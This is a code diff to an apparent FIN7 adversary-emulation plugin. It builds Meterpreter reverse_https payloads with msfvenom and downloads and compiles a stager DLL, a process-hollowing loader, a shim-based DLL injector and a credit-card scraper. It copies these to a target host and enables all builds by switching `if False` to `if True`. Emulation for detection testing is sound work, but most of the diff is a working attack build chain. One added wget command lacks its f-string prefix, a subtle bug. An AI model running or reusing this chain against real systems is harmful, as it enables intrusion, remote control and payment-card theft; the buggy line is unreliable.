@@ -178,12 +178,39 @@ In this simulation sql-rat.js communication will be replaced by Caldera communic
 
         # Generate shellcode
         # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
+
+
+        dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/babymetal.cpp"
+        architecture = "x64"
+        target_platform = "windows"
+        payload = self.payload_type_1
+        lhost = self.attacker_machine_plugin.get_ip()
+        lport = "443"
+        filename = "babymetal.dll"
+        encoding = "base64"
+        encoded_filename = "babymetal_encoded.txt"
+        sRDI_conversion = True
+        for_step = 4
+
+        logid = self.attack_logger.start_build(dl_uri=dl_uri,
+                                               architecture=architecture,
+                                               target_platform=target_platform,
+                                               payload=payload,
+                                               lhost=lhost,
+                                               lport=lport,
+                                               filename=filename,
+                                               encoding=encoding,
+                                               encoded_filename=encoded_filename,
+                                               sRDI_conversion=sRDI_conversion,
+                                               for_step=for_step,
+                                               comment="This is the stager uploaded to the target and executed to get the first Meterpreter shell on the target network.")
+
         venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
-        venom.generate_payload(payload=self.payload_type_1,
-                               architecture="x64",
-                               platform="windows",
-                               lhost=self.attacker_machine_plugin.get_ip(),
-                               lport="443",
+        venom.generate_payload(payload=payload,
+                               architecture=architecture,
+                               platform=target_platform,
+                               lhost=lhost,
+                               lport=lport,
                                exitfunc="thread",
                                format="c",
                                encrypt="xor",
@@ -194,7 +221,7 @@ In this simulation sql-rat.js communication will be replaced by Caldera communic
 
         # get C source
         self.attacker_machine_plugin.remote_run(
-            "cd tool_factory/step_4; rm babymetal.cpp; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/babymetal.cpp")
+            f"cd tool_factory/step_4; rm babymetal.cpp; wget {dl_uri}")
 
         # paste shellcode into C source
         self.attacker_machine_plugin.remote_run(
@@ -203,13 +230,15 @@ In this simulation sql-rat.js communication will be replaced by Caldera communic
         # Compile to DLL
         self.attacker_machine_plugin.remote_run("cd tool_factory/step_4; sed -i 's/#include <Windows.h>/#include <windows.h>/g' babymetal_patched.cpp")
         self.attacker_machine_plugin.remote_run(
-            "cd tool_factory/step_4;x86_64-w64-mingw32-g++ -shared babymetal_patched.cpp -o babymetal.dll")
+            f"cd tool_factory/step_4;x86_64-w64-mingw32-g++ -shared babymetal_patched.cpp -o {filename}")
 
         # sRDI conversion
-        self.attacker_machine_plugin.remote_run("cd tool_factory/; python3 sRDI/Python/ConvertToShellcode.py -f BabyMetal step_4/babymetal.dll")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/; python3 sRDI/Python/ConvertToShellcode.py -f BabyMetal step_4/{filename}")
 
         # base64 conversion
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_4; base64 babymetal.bin > babymetal_encoded.txt")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_4; base64 babymetal.bin > {encoded_filename}")
+
+        self.attack_logger.stop_build(logid = logid)
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}Step 4 compiling tools{CommandlineColors.ENDC}", 1)
@@ -381,14 +410,33 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
         # --encrypt xor       : xor encrypt the results
         # --encrypt-key m     : the encryption key
 
+        dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step6/Hollow/ProcessHollowing.c"
+        payload = self.payload_type_1
+        architecture = "x64"
+        target_platform = "windows"
+        lhost = self.attacker_machine_plugin.get_ip()
+        lport = "443"
+        filename = "hollow.exe"
+        for_step = 6
+
+        logid = self.attack_logger.start_build(dl_uri=dl_uri,
+                                               architecture=architecture,
+                                               target_platform=target_platform,
+                                               payload=payload,
+                                               lhost=lhost,
+                                               lport=lport,
+                                               filename=filename,
+                                               for_step=for_step,
+                                               comment="This will be copied using paexec to the it admin host. It will spawn svchost.exe there and create a first Meterpreter shell on this PC.")
+
         # Generate shellcode
         # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 -f exe -o msf.exe
         venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
-        venom.generate_payload(payload=self.payload_type_1,
-                               architecture="x64",
-                               platform="windows",
-                               lhost=self.attacker_machine_plugin.get_ip(),
-                               lport="443",
+        venom.generate_payload(payload=payload,
+                               architecture=architecture,
+                               platform=target_platform,
+                               lhost=lhost,
+                               lport=lport,
                                format="exe",
                                outfile="msf.executable")
 
@@ -399,7 +447,7 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
 
         # Get ProcessHollowing.c
         self.attacker_machine_plugin.remote_run(
-            "cd tool_factory/step_6; rm ProcessHollowing.c; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step6/Hollow/ProcessHollowing.c")
+            f"cd tool_factory/step_6; rm ProcessHollowing.c; wget {dl_uri}")
         self.attacker_machine_plugin.remote_run(
             "cd tool_factory/step_6; sed -i 's/#include <Windows.h>/#include <windows.h>/g' ProcessHollowing.c")
 
@@ -414,7 +462,9 @@ In the original attack Babymetal payload is a dll. Currently we are using a simp
 
         # Compiled for 64 bit.
         self.attacker_machine_plugin.remote_run("cd tool_factory/step_6; rm hollow.exe;")
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_6; x86_64-w64-mingw32-gcc -municode -D UNICODE -D _UNICODE ProcessHollowing.c -L/usr/x86_64-w64-mingw32/lib/ -l:libntdll.a -o hollow.exe")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_6; x86_64-w64-mingw32-gcc -municode -D UNICODE -D _UNICODE ProcessHollowing.c -L/usr/x86_64-w64-mingw32/lib/ -l:libntdll.a -o {filename}")
+
+        self.attack_logger.stop_build(logid=logid)
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}Step 6 compiling tools{CommandlineColors.ENDC}", 1)
@@ -555,13 +605,34 @@ NOT IMPLEMENTED YET. MAYBE DO THIS PARTIAL. KEYLOGGING NEEDS USER INTERACTION.
         accounting = self.get_target_by_name("accounting")
         self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_9")
 
+        payload = "windows/meterpreter/reverse_https"
+        filename = "dll329.dll"
+        for_step = 9
+        architecture = "x86"
+        target_platform = "windows"
+        lhost = self.attacker_machine_plugin.get_ip()
+        lport = "53"
+        sRDI_conversion = True
+        encoded_filename = "bin329.tmp"
+
+        logid = self.attack_logger.start_build(architecture=architecture,
+                                               target_platform=target_platform,
+                                               payload=payload,
+                                               lhost=lhost,
+                                               lport=lport,
+                                               filename=filename,
+                                               for_step=for_step,
+                                               sRDI_conversion= sRDI_conversion,
+                                               encoded_filename=encoded_filename,
+                                               comment="And SRDI converted Meterpreter shell. Will be stored in the registry.")
+
         # msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=53 -f dll -o payload.dll
         venom = MSFVenom(self.attacker_machine_plugin, accounting, self.attack_logger)
-        venom.generate_payload(payload="windows/meterpreter/reverse_https",
-                               architecture="x86",
-                               platform="windows",
-                               lhost=self.attacker_machine_plugin.get_ip(),
-                               lport="53",
+        venom.generate_payload(payload=payload,
+                               architecture=architecture,
+                               platform=target_platform,
+                               lhost=lhost,
+                               lport=lport,
                                format="dll",
                                outfile="payload.dll")
 
@@ -570,29 +641,50 @@ NOT IMPLEMENTED YET. MAYBE DO THIS PARTIAL. KEYLOGGING NEEDS USER INTERACTION.
         self.attacker_machine_plugin.remote_run("cd tool_factory/; python3 sRDI/Python/ConvertToShellcode.py step_9/payload.dll")
 
         # mv payload.bin bin329.tmp
-        self.attacker_machine_plugin.remote_run("cp tool_factory/step_9/payload.bin tool_factory/step_9/bin329.tmp")
+        self.attacker_machine_plugin.remote_run(f"cp tool_factory/step_9/payload.bin tool_factory/step_9/{encoded_filename}")
         # This will be stored in the registry
+        self.attack_logger.stop_build(logid=logid)
 
         # ## DLL 329
         # Build https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step9/InjectDLL-Shim
+
+        dl_uris = ["https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/dllmain.cpp",
+                   "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.cpp",
+                   "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.h"]
+        filename = "dll329.dll"
+        for_step = 9
+        logid = self.attack_logger.start_build(dl_uris=dl_uris,
+                                               filename=filename,
+                                               for_step=for_step,
+                                               comment="Will be injected into the AccoutingIQ executable.")
+
         self.attacker_machine_plugin.remote_run(
             "cd tool_factory/step_9; rm dllmain.cpp")
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/dllmain.cpp")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; wget {dl_uris[0]}")
 
         self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm pe.cpp;")
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.cpp")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; wget {dl_uris[1]}")
 
         self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm pe.h;")
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.h")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; wget {dl_uris[2]}")
 
         # Compiling dll 329
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm dll329.dll;")
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; i686-w64-mingw32-g++ -m32 -shared -municode -D UNICODE -D _UNICODE -fpermissive dllmain.cpp pe.cpp -L/usr/i686-w64-mingw32/lib/ -l:libntoskrnl.a -l:libntdll.a -o dll329.dll")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; rm {filename};")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; i686-w64-mingw32-g++ -m32 -shared -municode -D UNICODE -D _UNICODE -fpermissive dllmain.cpp pe.cpp -L/usr/i686-w64-mingw32/lib/ -l:libntoskrnl.a -l:libntdll.a -o {filename}")
+        self.attack_logger.stop_build(logid=logid)
 
         # ## sdbE376.tmp
+        dl_uri = "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/fin7/Resources/Step9/sdbE376.tmp"
+        filename = "sdbE376.tmp"
+        logid = self.attack_logger.start_build(dl_uri=dl_uri,
+                                               filename=filename,
+                                               for_step=9,
+                                               comment="An SDB Shim database file. Will be installed for application shimming.")
         # Just download https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/fin7/Resources/Step9/sdbE376.tmp
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm sdbE376.tmp")
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; wget https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/fin7/Resources/Step9/sdbE376.tmp")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; rm {filename}")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; wget {dl_uri}")
+
+        self.attack_logger.stop_build(logid=logid)
 
         self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Step 9 compiling tools{CommandlineColors.ENDC}", 1)
 
@@ -627,6 +719,8 @@ NOT IMPLEMENTED YET
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 10 compiling tools{CommandlineColors.ENDC}", 1)
 
+        accounting = self.get_target_by_name("accounting")
+
         # Compiling
 
         # i686-w64-mingw32-gcc is for 32 bit
@@ -634,33 +728,50 @@ NOT IMPLEMENTED YET
 
         # Important: pillowMint is not very complex and looks for the data at a fixed address. As we a re-compiling AccountIQ.exe and the data address does not match the expected one we will just get garbage.
 
+        filename = "AccountingIQ.exe"
+        dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/AccountingIQ.c"
+        logid = self.attack_logger.start_build(
+                                               filename=filename,
+                                               for_step=10,
+                                               dl_uri=dl_uri,
+                                               comment="This is a simulated credit card tool to target. The final flag is in here.")
         # simulated credit card tool as target
         self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_10")  # MSFVenom needs to be installed
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_10; rm AccountingIQ.exe")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_10; rm {filename}")
         self.attacker_machine_plugin.remote_run(
-            "cd tool_factory/step_10; rm AccountingIQ.c; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/AccountingIQ.c")
+            "cd tool_factory/step_10; rm AccountingIQ.c; wget {dl_uri}")
         self.attacker_machine_plugin.remote_run(
-            "cd tool_factory/step_10; i686-w64-mingw32-gcc -m32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include AccountingIQ.c -o AccountingIQ.exe")
+            f"cd tool_factory/step_10; i686-w64-mingw32-gcc -m32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include AccountingIQ.c -o {filename}")
 
-        self.attacker_machine_plugin.get("tool_factory/step_10/AccountingIQ.exe",
+        self.attacker_machine_plugin.get(f"tool_factory/step_10/{filename}",
                                          os.path.join(os.path.dirname(self.plugin_path), "resources", "step10",
-                                                      "AccountingIQ.exe"))
+                                                      filename))
+        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", filename),
+                       filename)
+
+        self.attack_logger.stop_build(logid=logid)
 
         # Simulated credit card scraper
-        self.attacker_machine_plugin.remote_run("cd tool_factory/step_10; rm pillowMint.exe")
-        self.attacker_machine_plugin.remote_run(
-            "cd tool_factory/step_10; rm pillowMint.cpp; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/pillowMint.cpp")
-        self.attacker_machine_plugin.remote_run(
-            "cd tool_factory/step_10; x86_64-w64-mingw32-g++ -static pillowMint.cpp -o pillowMint.exe")
-        self.attacker_machine_plugin.get("tool_factory/step_10/pillowMint.exe",
-                                         os.path.join(os.path.dirname(self.plugin_path), "resources", "step10",
-                                                      "pillowMint.exe"))
 
-        accounting = self.get_target_by_name("accounting")
-        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"),
-                       "pillowMint.exe")
-        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "AccountingIQ.exe"),
-                       "AccountingIQ.exe")
+        filename = "pillowMint.exe"
+        dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/pillowMint.cpp"
+        logid = self.attack_logger.start_build(
+            filename=filename,
+            for_step=10,
+            dl_uri=dl_uri,
+            comment="This is a simulated credit card data scraper.")
+        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_10; rm {filename}")
+        self.attacker_machine_plugin.remote_run(
+            f"cd tool_factory/step_10; rm pillowMint.cpp; wget {dl_uri}")
+        self.attacker_machine_plugin.remote_run(
+            f"cd tool_factory/step_10; x86_64-w64-mingw32-g++ -static pillowMint.cpp -o {filename}")
+        self.attacker_machine_plugin.get(f"tool_factory/step_10/{filename}",
+                                         os.path.join(os.path.dirname(self.plugin_path), "resources", "step10",
+                                                      filename))
+
+        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", filename),
+                       filename)
+        self.attack_logger.stop_build(logid=logid)
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}Step 10 compiling tools{CommandlineColors.ENDC}", 1)
@@ -725,7 +836,7 @@ NOT IMPLEMENTED YET. NEEDS TARGET REBOOTING: NO IDEA IF ATTACKX CAN SUPPORT THAT
 
         # Those build calls will be called from the steps directly. But it is always conveniet for testing to use that now directly while developing
         # Building the tools is temporarily de-activated. Without the proper environment the tools being built are useless. Many attacks run on temporary attacks
-        if False:
+        if True:
             self.build_step4()  # DONE
             self.build_step6()  # DONE
             # TODO: self.build_step7()  # Will not be done until the environment is planned. This step needs Aloha Command Center on the target. Maybe we write our own vulnerable app....
